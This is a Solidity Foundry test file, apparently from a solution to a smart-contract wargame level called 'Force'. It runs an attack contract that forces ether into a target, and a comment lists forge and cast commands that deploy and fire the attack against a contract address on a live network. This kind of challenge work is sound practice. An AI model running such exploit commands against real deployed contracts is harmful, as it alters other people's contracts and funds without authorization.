// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";
import {ForceAttack} from "../solutions/ForceAttack.sol";

contract ForceTest is Test {
    Force public force;
    ForceAttack public attackContract;
    address public attacker;

    function setUp() public {
        force = new Force();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_attackForceContract() public {
        vm.startPrank(attacker);

        assertEq(address(force).balance, 0);

        attackContract = new ForceAttack(address(force));
        attackContract.attack{value: 0.1 ether}();

        assert(address(force).balance > 0);

        vm.stopPrank();
    }
}

/*
source .env

export force=0x30CBB9A46762D9aC41298bA3f43Dec55959Ba879
forge create solutions/ForceAttack.sol:ForceAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $force

export attackContract=0x69F478774B2ce15A77432b6CB1302f31d732018D
cast send $attackContract "attack()" --value 0.001ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast balance $force --rpc-url $RPC_URL

*/
